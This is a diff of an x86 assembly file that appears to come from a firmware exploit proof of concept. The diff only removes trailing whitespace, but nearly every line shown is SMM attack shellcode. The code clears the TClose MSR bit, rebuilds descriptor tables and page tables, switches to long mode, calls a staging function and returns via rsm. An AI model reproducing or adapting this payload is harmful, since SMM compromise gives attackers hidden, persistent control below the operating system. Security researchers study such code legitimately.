@@ -27,7 +27,7 @@ section .text
 ; This code is executed in SMM by Core0 as part of the attack
 [bits 32]
 _core0_shell:
-    
+
 	; Clear TClose
 	mov ecx,0xc0010113
 	rdmsr
@@ -40,13 +40,13 @@ o16 mov     es, ax
 o16 mov     fs, ax
 o16 mov     gs, ax
 o16 mov     ss, ax
-    mov esp, CORE0_INITIAL_STACK  
+    mov esp, CORE0_INITIAL_STACK
 
 	; Clean the GDT and CS
 	mov ecx, ORIGINAL_GDTR
 	lgdt  [ecx]
 
-	push    PROTECT_MODE_CS             
+	push    PROTECT_MODE_CS
     mov 	eax, CORE0_NEXT_STAGE
 	push 	eax
 	retf
@@ -55,17 +55,17 @@ next_stage:
 
 	; mov ecx, SQUIRREL_BAR
 	; lea ecx, [ecx + 0]
-	; mov byte [ecx], 0xFA 
+	; mov byte [ecx], 0xFA
 	; xor ecx,ecx
 
     jmp     ProtFlatMode
 
 [BITS 64]
 ProtFlatMode:
-	
+
 	; mov rcx, SQUIRREL_BAR
 	; lea rcx, [rcx + 0x1]
-	; mov byte [rcx], 0xFB 
+	; mov byte [rcx], 0xFB
 	; xor rcx,rcx
 
 	mov eax, CORE0_PAGE_TABLE_BASE
@@ -75,12 +75,12 @@ ProtFlatMode:
 
 	; mov rcx, SQUIRREL_BAR
 	; lea rcx, [rcx + 0x2]
-	; mov byte [rcx], 0xFC 
+	; mov byte [rcx], 0xFC
 	; xor rcx,rcx
 
 	; Load TSS
     sub     esp, 8                      ; reserve room in stack
-    sgdt    [rsp]	
+    sgdt    [rsp]
     mov     eax, [rsp + 2]              ; eax = GDT base
     add     esp, 8
     mov     dl, 0x89
@@ -90,7 +90,7 @@ ProtFlatMode:
 
 	; mov rcx, SQUIRREL_BAR
 	; lea rcx, [rcx + 0x3]
-	; mov byte [rcx], 0xFD 
+	; mov byte [rcx], 0xFD
 	; xor rcx,rcx
 
 	push    LONG_MODE_CS               ; push cs hardcore here
@@ -110,11 +110,11 @@ Base:
 
 	; mov rcx, SQUIRREL_BAR
 	; lea rcx, [rcx + 0x4]
-	; mov byte [rcx], 0xFE 
-	; xor rcx,rcx	
+	; mov byte [rcx], 0xFE
+	; xor rcx,rcx
 
     retf
-	
+
 
 @LongMode:
 	mov     ax, LONG_MODE_DS
@@ -133,7 +133,7 @@ o16	mov 	ss, ax
 	; mov dword [rcx], 0x41414141
 
 	mov 	rax, X64_STAGING_FUNC_VA
-	call 	rax	 
+	call 	rax
 
 	; mov rcx, SQUIRREL_BAR
 	; lea rcx, [rcx + 0x60]
@@ -141,14 +141,14 @@ o16	mov 	ss, ax
 
 	; Return from SMM
 	rsm
-	
+
 	nop
 	nop
 	nop
 	nop
 	db 'I'
 	db 'O'
-	db 'A'	
+	db 'A'
 	nop
 	nop
 	nop
